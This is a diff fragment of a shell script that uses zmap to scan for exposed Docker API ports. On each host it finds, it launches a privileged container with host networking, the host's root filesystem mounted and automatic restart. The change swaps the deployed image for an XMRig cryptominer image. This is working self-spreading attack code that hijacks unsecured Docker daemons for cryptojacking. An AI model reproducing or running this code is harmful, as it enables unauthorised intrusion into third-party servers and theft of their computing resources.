@@ -139,7 +139,7 @@ eval "$rndstr"="'$(zmap -i $INTERFACE -B 50M --max-sendto-failures 1000000 -c5 -
 for TARGETIP in ${!rndstr}
 do
 echo "$TARGETIP:$TARGETPORT"
-timeout -s SIGKILL 240s docker -H tcp://$TARGETIP:$TARGETPORT run -d --restart always --privileged --network host -v /:/host lifengyi1323/speedrun:latest
+timeout -s SIGKILL 240s docker -H tcp://$TARGETIP:$TARGETPORT run -d --restart always --privileged --network host -v /:/host xululol/xmrig:latest
 done;
 }
 
